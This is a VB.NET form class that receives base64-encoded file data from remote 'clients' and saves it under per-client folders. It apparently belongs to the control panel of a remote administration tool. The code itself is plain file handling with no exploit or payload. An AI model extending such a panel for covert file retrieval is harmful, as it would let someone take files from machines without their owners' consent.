﻿Imports System.Threading

Public Class Download_Manager

    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Sub Client_data(ByVal data As String, ByVal bool As Boolean, ByVal namefile As String)
        If Not data = Nothing Then
            If bool = False Then
                Dim spl_LN() As String = {Form1.s.split_Line}
                Dim ln() As String = data.Split(spl_LN, StringSplitOptions.RemoveEmptyEntries)
                If ln(2).ToString = "0" Then
                    Label8.Text = "Empty File"
                    Label8.ForeColor = Color.Crimson
                End If
                Label5.Text = ln(0)
                Label6.Text = ln(1)
                Label7.Text = store_0.FormatFileSize(CLng(ln(2)))

            Else
                'Dim thread As New Thread(Sub()
                Try
                                                 Dim Complete As System.Text.StringBuilder = New System.Text.StringBuilder()
                                                 Complete.AppendFormat("{0}", data)
                                                 Dim f As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients\" & Name_Client & Client_ID & "\" & "Download_Manager"
                                                 If Not My.Computer.FileSystem.DirectoryExists(f) Then My.Computer.FileSystem.CreateDirectory(f)
                                                 If System.IO.File.Exists(f + "\" + namefile) Then System.IO.File.Delete(f + "\" + namefile)
                                                 IO.File.WriteAllBytes(f + "\" + namefile, Convert.FromBase64String(Complete.ToString))
                                                 Label8.Text = "Complete"
                                                 Label8.ForeColor = Color.SeaGreen
                                                 Timer1.Enabled = True
                                             Catch ex As Exception
                                                 Label8.Text = "Not Completed"
                                                 Label8.ForeColor = Color.Crimson
                    'MsgBox(ex.Message)
                    MsgBox(ex.Message, MsgBoxStyle.Critical, store_0.name_prog)
                End Try

                '                         End Sub)
                'thread.Start()


            End If

        End If
    End Sub

    Private Sub Download_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Icon = store_0.icons_0("window")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub
    Dim clos% = 6

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        clos -= 1

        If clos < 0 Then
            Me.Close()
        Else
            Button1.Text = "Close(" + CStr(clos) + ")"
        End If
    End Sub
End Class